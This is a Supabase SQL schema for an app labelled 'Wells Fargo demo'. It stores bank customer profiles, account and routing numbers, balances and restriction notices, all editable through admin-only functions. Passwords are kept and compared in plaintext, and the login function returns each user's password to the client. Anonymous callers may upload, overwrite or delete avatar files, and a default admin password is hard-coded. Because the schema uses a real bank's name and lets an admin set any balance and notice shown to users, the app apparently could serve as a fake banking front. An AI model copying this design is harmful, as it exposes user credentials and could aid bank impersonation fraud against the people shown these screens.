-- Wells Fargo demo — Supabase schema
-- Run this in the Supabase SQL Editor first.

create extension if not exists "pgcrypto";

-- ---------------------------------------------------------------------------
-- Bank customers (end-user profiles shown in the mobile app)
-- ---------------------------------------------------------------------------
create table if not exists public.bank_customers (
  id text primary key,
  username text not null unique,
  password text not null,
  full_name text not null,
  first_name text,
  dob text default '',
  age text default '',
  sex text default '',
  relationship text default '',
  address text default '',
  state text default '',
  zip text default '',
  email text default '',
  phone text default '',
  photo_url text default '',
  since_label text default '',
  show_address boolean default true,
  account_number text default '',
  routing_number text default '',
  accounts jsonb not null default '[]'::jsonb,
  card_balance text default '$0.00',
  spending_balance text default '$0.00',
  show_spending_card boolean default false,
  show_restriction_notice boolean default false,
  history_extras jsonb not null default '[]'::jsonb,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create index if not exists bank_customers_username_idx on public.bank_customers (username);

-- ---------------------------------------------------------------------------
-- Admin users + sessions (admin dashboard auth)
-- ---------------------------------------------------------------------------
create table if not exists public.admin_users (
  id uuid primary key default gen_random_uuid(),
  username text not null unique,
  password text not null,
  display_name text not null default 'Admin',
  created_at timestamptz not null default now()
);

create table if not exists public.admin_sessions (
  token uuid primary key default gen_random_uuid(),
  admin_id uuid not null references public.admin_users(id) on delete cascade,
  expires_at timestamptz not null,
  created_at timestamptz not null default now()
);

create index if not exists admin_sessions_admin_id_idx on public.admin_sessions (admin_id);

-- ---------------------------------------------------------------------------
-- Updated-at trigger
-- ---------------------------------------------------------------------------
create or replace function public.set_updated_at()
returns trigger
language plpgsql
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists bank_customers_set_updated_at on public.bank_customers;
create trigger bank_customers_set_updated_at
  before update on public.bank_customers
  for each row execute function public.set_updated_at();

-- ---------------------------------------------------------------------------
-- Auth helpers (SECURITY DEFINER so anon key can call them safely)
-- ---------------------------------------------------------------------------
create or replace function public.authenticate_bank_user(p_username text, p_password text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
begin
  select * into row
  from public.bank_customers
  where username = trim(p_username)
    and password = p_password
  limit 1;

  if not found then
    return null;
  end if;

  return jsonb_build_object(
    'id', row.id,
    'username', row.username,
    'password', row.password,
    'name', row.full_name,
    'firstName', coalesce(nullif(row.first_name, ''), row.full_name),
    'dob', coalesce(row.dob, ''),
    'age', coalesce(row.age, ''),
    'sex', coalesce(row.sex, ''),
    'relationship', coalesce(row.relationship, ''),
    'address', coalesce(row.address, ''),
    'state', coalesce(row.state, ''),
    'zip', coalesce(row.zip, ''),
    'email', coalesce(row.email, ''),
    'phone', coalesce(row.phone, ''),
    'photo', coalesce(row.photo_url, ''),
    'since', coalesce(row.since_label, ''),
    'showAddress', coalesce(row.show_address, false),
    'accountNumber', coalesce(row.account_number, ''),
    'routingNumber', coalesce(row.routing_number, ''),
    'accounts', coalesce(row.accounts, '[]'::jsonb),
    'cardBalance', coalesce(row.card_balance, '$0.00'),
    'spendingBalance', coalesce(row.spending_balance, '$0.00'),
    'showSpendingCard', coalesce(row.show_spending_card, false),
    'showRestrictionNotice', coalesce(row.show_restriction_notice, false),
    'historyExtras', coalesce(row.history_extras, '[]'::jsonb)
  );
end;
$$;

create or replace function public.admin_login(p_username text, p_password text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  adm public.admin_users%rowtype;
  sess_token uuid;
  sess_expires timestamptz;
begin
  select * into adm
  from public.admin_users
  where username = trim(p_username)
    and password = p_password
  limit 1;

  if not found then
    return null;
  end if;

  sess_expires := now() + interval '14 days';
  insert into public.admin_sessions (admin_id, expires_at)
  values (adm.id, sess_expires)
  returning token into sess_token;

  return jsonb_build_object(
    'token', sess_token,
    'username', adm.username,
    'displayName', adm.display_name,
    'expiresAt', sess_expires
  );
end;
$$;

create or replace function public.admin_session_valid(p_token uuid)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  return exists (
    select 1
    from public.admin_sessions
    where token = p_token
      and expires_at > now()
  );
end;
$$;

create or replace function public.admin_list_customers(p_token uuid)
returns setof public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  return query
    select * from public.bank_customers
    order by created_at desc;
end;
$$;

create or replace function public.admin_get_customer(p_token uuid, p_id text)
returns public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  select * into row from public.bank_customers where id = p_id;
  return row;
end;
$$;

create or replace function public.admin_upsert_customer(p_token uuid, p_payload jsonb)
returns public.bank_customers
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
  cid text;
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;

  cid := coalesce(nullif(p_payload->>'id', ''), encode(gen_random_bytes(8), 'hex'));

  insert into public.bank_customers as bc (
    id, username, password, full_name, first_name, dob, age, sex, relationship,
    address, state, zip, email, phone, photo_url, since_label, show_address,
    account_number, routing_number, accounts, card_balance, spending_balance,
    show_spending_card, show_restriction_notice, history_extras
  ) values (
    cid,
    trim(p_payload->>'username'),
    p_payload->>'password',
    trim(p_payload->>'full_name'),
    coalesce(nullif(p_payload->>'first_name', ''), trim(p_payload->>'full_name')),
    coalesce(p_payload->>'dob', ''),
    coalesce(p_payload->>'age', ''),
    coalesce(p_payload->>'sex', ''),
    coalesce(p_payload->>'relationship', ''),
    coalesce(p_payload->>'address', ''),
    coalesce(p_payload->>'state', ''),
    coalesce(p_payload->>'zip', ''),
    coalesce(p_payload->>'email', ''),
    coalesce(p_payload->>'phone', ''),
    coalesce(p_payload->>'photo_url', ''),
    coalesce(p_payload->>'since_label', ''),
    coalesce((p_payload->>'show_address')::boolean, true),
    coalesce(p_payload->>'account_number', ''),
    coalesce(p_payload->>'routing_number', ''),
    coalesce(p_payload->'accounts', '[]'::jsonb),
    coalesce(p_payload->>'card_balance', '$0.00'),
    coalesce(p_payload->>'spending_balance', '$0.00'),
    coalesce((p_payload->>'show_spending_card')::boolean, false),
    coalesce((p_payload->>'show_restriction_notice')::boolean, false),
    coalesce(p_payload->'history_extras', '[]'::jsonb)
  )
  on conflict (id) do update set
    username = excluded.username,
    password = excluded.password,
    full_name = excluded.full_name,
    first_name = excluded.first_name,
    dob = excluded.dob,
    age = excluded.age,
    sex = excluded.sex,
    relationship = excluded.relationship,
    address = excluded.address,
    state = excluded.state,
    zip = excluded.zip,
    email = excluded.email,
    phone = excluded.phone,
    photo_url = excluded.photo_url,
    since_label = excluded.since_label,
    show_address = excluded.show_address,
    account_number = excluded.account_number,
    routing_number = excluded.routing_number,
    accounts = excluded.accounts,
    card_balance = excluded.card_balance,
    spending_balance = excluded.spending_balance,
    show_spending_card = excluded.show_spending_card,
    show_restriction_notice = excluded.show_restriction_notice,
    history_extras = excluded.history_extras
  returning * into row;

  return row;
end;
$$;

create or replace function public.admin_delete_customer(p_token uuid, p_id text)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;
  delete from public.bank_customers where id = p_id;
  return true;
end;
$$;

create or replace function public.admin_logout(p_token uuid)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  delete from public.admin_sessions where token = p_token;
  return true;
end;
$$;

-- ---------------------------------------------------------------------------
-- RLS: block direct table access; use RPCs above
-- ---------------------------------------------------------------------------
alter table public.bank_customers enable row level security;
alter table public.admin_users enable row level security;
alter table public.admin_sessions enable row level security;

revoke all on public.bank_customers from anon, authenticated;
revoke all on public.admin_users from anon, authenticated;
revoke all on public.admin_sessions from anon, authenticated;

grant execute on function public.authenticate_bank_user(text, text) to anon, authenticated;
grant execute on function public.admin_login(text, text) to anon, authenticated;
grant execute on function public.admin_session_valid(uuid) to anon, authenticated;
grant execute on function public.admin_list_customers(uuid) to anon, authenticated;
grant execute on function public.admin_get_customer(uuid, text) to anon, authenticated;
grant execute on function public.admin_upsert_customer(uuid, jsonb) to anon, authenticated;
grant execute on function public.admin_delete_customer(uuid, text) to anon, authenticated;
grant execute on function public.admin_logout(uuid) to anon, authenticated;

-- ---------------------------------------------------------------------------
-- Storage bucket for profile photos
-- ---------------------------------------------------------------------------
insert into storage.buckets (id, name, public)
values ('avatars', 'avatars', true)
on conflict (id) do nothing;

-- Public read for avatars
drop policy if exists "Avatar public read" on storage.objects;
create policy "Avatar public read"
  on storage.objects for select
  using (bucket_id = 'avatars');

-- Allow anon uploads into avatars (admin UI uses anon key + session gate in app)
drop policy if exists "Avatar anon upload" on storage.objects;
create policy "Avatar anon upload"
  on storage.objects for insert
  to anon, authenticated
  with check (bucket_id = 'avatars');

drop policy if exists "Avatar anon update" on storage.objects;
create policy "Avatar anon update"
  on storage.objects for update
  to anon, authenticated
  using (bucket_id = 'avatars');

drop policy if exists "Avatar anon delete" on storage.objects;
create policy "Avatar anon delete"
  on storage.objects for delete
  to anon, authenticated
  using (bucket_id = 'avatars');

-- ---------------------------------------------------------------------------
-- Default admin (change password after first login)
-- username: admin  /  password: Admin@2026!
-- ---------------------------------------------------------------------------
insert into public.admin_users (username, password, display_name)
values ('admin', 'Admin@2026!', 'Site Admin')
on conflict (username) do nothing;
